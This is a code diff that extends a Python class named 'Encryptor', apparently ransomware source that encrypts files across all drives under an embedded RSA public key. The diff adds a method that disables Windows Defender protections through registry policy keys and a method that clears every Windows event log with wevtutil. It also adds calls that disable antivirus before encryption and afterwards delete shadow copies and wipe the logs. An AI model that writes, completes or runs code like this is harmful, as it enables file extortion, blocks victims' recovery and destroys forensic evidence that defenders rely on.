@@ -5,6 +5,7 @@ import subprocess
 import psutil
 import os
 import time
+import winreg as reg
 from keygen import *
 from collections import deque # voor snellere list operaties
 
@@ -242,7 +243,42 @@ class Encryptor:
         except subprocess.CalledProcessError:
             print("need administrator.")
 
+    def disable_windows_antivirus(self):
+        """
+        a method which disables windows antivirus
+        """
+        try:
+            # Path to Windows Defender registry key
+            defender_path = r"SOFTWARE\Policies\Microsoft\Windows Defender"
 
+            # Open or create the key
+            with reg.OpenKey(reg.HKEY_LOCAL_MACHINE, defender_path, 0, reg.KEY_SET_VALUE) as key:
+                reg.SetValueEx(key, "DisableAntiSpyware", 0, reg.REG_DWORD, 1)
+
+            # Disable Real-Time Protection
+            realtime_path = r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
+            with reg.CreateKey(reg.HKEY_LOCAL_MACHINE, realtime_path) as key:
+                reg.SetValueEx(key, "DisableRealtimeMonitoring", 0, reg.REG_DWORD, 1)
+                reg.SetValueEx(key, "DisableBehaviorMonitoring", 0, reg.REG_DWORD, 1)
+                reg.SetValueEx(key, "DisableOnAccessProtection", 0, reg.REG_DWORD, 1)
+                reg.SetValueEx(key, "DisableScanOnRealtimeEnable", 0, reg.REG_DWORD, 1)
+
+            print("[+] Windows Defender has been disabled. Restart your computer for changes to take effect.")
+        except PermissionError:
+            print("[-] Permission Denied. Run this script as Administrator.")
+        except Exception as e:
+            print(f"[-] Error: {e}")
+
+    def clear_event_logs(self):
+        try:
+            print("[LOG] Clearing windows event logs...")
+            logs = subprocess.check_output("wevtutil el", shell=True).decode().splitlines()
+            for log in logs:
+                #print(f"[LOG]Clearing log: {log}")
+                subprocess.run(f"wevtutil cl \"{log}\"", shell=True)
+            print("[+] All Windows Event Logs have been cleared.")
+        except Exception as e:
+            print(f"[-] Error: {e}")
 
 if __name__ == "__main__":
     encrypt = Encryptor("""
@@ -252,9 +288,13 @@ AV7DcTOBODMlxLKIFgPhMjMfAF26rOkBCGWjY2ASiJgW1oaB79iY1cs9XvDq0v42
 CaEDN8Le4YwFF8ekF4zEg3lbfLvoOdmcu477+1aQ8XzZQ5PMZBERAgMBAAE=
 -----END RSA PUBLIC KEY-----
     """)
+
+    encrypt.disable_windows_antivirus()
     encrypt.scan_drives()
     encrypt.get_files()
     encrypt.start_encryption_process()
+    encrypt.delete_shadow_copies()
+    encrypt.clear_event_logs()
 
 
     
